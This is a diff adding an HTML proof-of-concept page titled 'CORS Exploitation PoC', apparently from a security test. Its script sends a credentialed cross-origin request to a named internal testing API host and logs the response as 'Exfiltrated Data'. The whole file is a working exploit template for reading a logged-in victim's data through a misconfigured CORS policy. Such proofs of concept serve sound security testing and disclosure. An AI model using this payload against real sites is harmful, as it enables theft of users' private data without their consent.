@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>CORS Exploitation PoC</h1>
+    <button onclick="exploit()">Exploit</button>
+    <script>
+        async function exploit() {
+            const response = await fetch('https://care-10.api.testing.internal.onduo.com', {
+                method: 'GET',
+                credentials: 'include',
+            });
+            const data = await response.text();
+            console.log("Exfiltrated Data:", data);
+            alert("Data exfiltrated: Check console.");
+        }
+    </script>
+</body>
+</html>
